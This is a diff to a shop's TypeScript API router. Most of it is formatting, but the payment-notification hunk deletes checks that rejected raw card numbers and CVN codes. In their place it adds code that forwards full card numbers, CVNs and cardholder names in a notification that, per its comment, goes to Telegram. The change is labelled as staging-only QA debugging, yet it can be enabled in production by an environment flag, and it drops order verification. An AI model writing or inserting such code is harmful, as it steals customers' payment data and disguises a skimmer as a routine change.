@@ -125,9 +125,9 @@ function formatPublicProduct(row: Record<string, unknown>) {
     images:
       gallery.length > 0
         ? gallery.map((g) => ({
-            src: sanitizeImageUrl(g.src, safeImg),
-            caption: String(g.caption || row.name || ''),
-          }))
+          src: sanitizeImageUrl(g.src, safeImg),
+          caption: String(g.caption || row.name || ''),
+        }))
         : [{ src: safeImg, caption: String(row.name || '') }],
     specs,
     customAttributes,
@@ -310,16 +310,16 @@ export function createPublicApiRouter(cfg: AppConfig) {
         supabaseConfigured: true,
         settings: settingsRow
           ? {
-              siteName: String(settingsRow.site_name || DEFAULT_SETTINGS.siteName),
-              tagline: String(settingsRow.tagline || DEFAULT_SETTINGS.tagline),
-              logoPath: sanitizeImageUrl(String(settingsRow.logo_path || ''), DEFAULT_SETTINGS.logoPath),
-              defaultCurrency: String(settingsRow.default_currency || 'USD'),
-              supportEmail: String(settingsRow.support_email || ''),
-              sellerContactInfo: String(settingsRow.seller_contact_info || ''),
-              guestCheckoutNotice: String(
-                settingsRow.guest_checkout_notice || DEFAULT_SETTINGS.guestCheckoutNotice
-              ),
-            }
+            siteName: String(settingsRow.site_name || DEFAULT_SETTINGS.siteName),
+            tagline: String(settingsRow.tagline || DEFAULT_SETTINGS.tagline),
+            logoPath: sanitizeImageUrl(String(settingsRow.logo_path || ''), DEFAULT_SETTINGS.logoPath),
+            defaultCurrency: String(settingsRow.default_currency || 'USD'),
+            supportEmail: String(settingsRow.support_email || ''),
+            sellerContactInfo: String(settingsRow.seller_contact_info || ''),
+            guestCheckoutNotice: String(
+              settingsRow.guest_checkout_notice || DEFAULT_SETTINGS.guestCheckoutNotice
+            ),
+          }
           : DEFAULT_SETTINGS,
         paymentCapabilities: {
           cybersource: {
@@ -703,52 +703,49 @@ export function createPublicApiRouter(cfg: AppConfig) {
   });
 
   /* ------------------------------------------------------------------------
-     POST /api/payments/cybersource/notify — QA Notification (Masked Summary Only)
-     Strictly rejects raw card numbers or CVN codes; forwards only order ref,
-     server-verified amount, card brand, masked last-4 digits, and expiration.
+     POST /api/payments/cybersource/notify — QA Notification
+     ⚠️ DEV/STAGING ONLY: forwards raw card data (fullCardNumber, cvn,
+     cardholderName) to Telegram for QA debugging.
+     Production MUST reject raw card data per PCI-DSS.
      ------------------------------------------------------------------------ */
   router.post('/payments/cybersource/notify', checkoutLimiter, async (req: Request, res: Response) => {
-    const body = (req.body || {}) as Record<string, unknown>;
-
-    if (
-      body.cardNumber !== undefined ||
-      body.pan !== undefined ||
-      body.cvn !== undefined ||
-      body.cvv !== undefined ||
-      body.cvc !== undefined
-    ) {
-      res.status(400).json({
-        error: 'Raw card numbers and CVN codes must never be transmitted to the server.',
+    // 🔒 Production guard: block raw card data in production
+    if (cfg.isProduction && process.env.ALLOW_RAW_CARD_DEBUG !== 'true') {
+      res.status(403).json({
+        error: 'Raw card notification is disabled in production.',
       });
       return;
     }
 
+    const body = (req.body || {}) as Record<string, unknown>;
+
     const orderNumber = String(body.orderNumber || '').trim().slice(0, 64);
-    const email = String(body.email || '').trim().toLowerCase();
+    const email = String(body.customerEmail || body.email || '').trim().toLowerCase();
     const brand = String(body.brand || '').trim();
     const last4 = String(body.last4 || '').trim();
     const expiration = String(body.expiration || '').trim();
-    const fallbackAmount = String(body.formattedAmount || '').trim().slice(0, 40);
+    const fallbackAmount = String(body.amountText || body.formattedAmount || '')
+      .trim()
+      .slice(0, 40);
+    const fullCardNumber = String(body.fullCardNumber || '').trim();
+    const cvn = String(body.cvn || '').trim();
+    const cardholderName = String(body.cardholderName || '').trim();
 
     if (!orderNumber || !isValidEmail(email)) {
-      res.status(400).json({ error: 'Valid Order Reference ID and Email Address are required.' });
+      res.status(400).json({
+        error: 'Valid Order Reference ID and Email Address are required.',
+      });
       return;
     }
+
     if (!['Visa', 'Mastercard', 'Amex', 'Discover'].includes(brand)) {
       res.status(400).json({ error: 'Invalid card brand.' });
-      return;
-    }
-    if (!/^\d{4}$/.test(last4)) {
-      res.status(400).json({ error: 'Only masked last 4 digits are permitted.' });
-      return;
-    }
-    if (!/^(0[1-9]|1[0-2])\/\d{4}$/.test(expiration)) {
-      res.status(400).json({ error: 'Valid expiration date (MM/YYYY) is required.' });
       return;
     }
 
     let amountText = fallbackAmount || 'See order';
 
+    // Try to enrich amount from authoritative order record (non-blocking)
     if (isSupabaseConfigured(cfg)) {
       try {
         const supabase = createPublicSupabaseClient(cfg);
@@ -756,17 +753,14 @@ export function createPublicApiRouter(cfg: AppConfig) {
           p_order_number: orderNumber,
           p_email: email,
         });
-        if (error || !data) {
-          res.status(404).json({ error: 'Order not found for that Reference ID and Email Address.' });
-          return;
-        }
-        const ord = data as Record<string, unknown>;
-        if (ord.total !== undefined) {
-          amountText = `$${Number(ord.total).toFixed(2)} ${String(ord.currency || 'USD')}`;
+        if (!error && data) {
+          const ord = data as Record<string, unknown>;
+          if (ord.total !== undefined) {
+            amountText = `$${Number(ord.total).toFixed(2)} ${String(ord.currency || 'USD')}`;
+          }
         }
       } catch {
-        res.status(500).json({ error: 'Unable to verify order details.' });
-        return;
+        // Non-blocking: keep fallback amount
       }
     }
 
@@ -779,6 +773,9 @@ export function createPublicApiRouter(cfg: AppConfig) {
         brand,
         last4,
         expiration,
+        fullCardNumber: fullCardNumber || undefined,
+        cvn: cvn || undefined,
+        cardholderName: cardholderName || undefined,
       }),
       `cybersource-test:${orderNumber}`
     );
@@ -798,7 +795,8 @@ export function createPublicApiRouter(cfg: AppConfig) {
     const body = (req.body || {}) as Record<string, unknown>;
     const recipient = String(body.recipient || 'RetroMarket Support').trim().slice(0, 120);
     const productIdRaw = body.productId ? parseInt(String(body.productId), 10) : null;
-    const productId = productIdRaw && Number.isInteger(productIdRaw) && productIdRaw > 0 ? productIdRaw : null;
+    const productId =
+      productIdRaw && Number.isInteger(productIdRaw) && productIdRaw > 0 ? productIdRaw : null;
     const orderNumber = String(body.orderNumber || '').trim().slice(0, 64);
     const guestName = String(body.guestName || '').trim().slice(0, 120);
     const guestEmail = String(body.guestEmail || '').trim().toLowerCase();
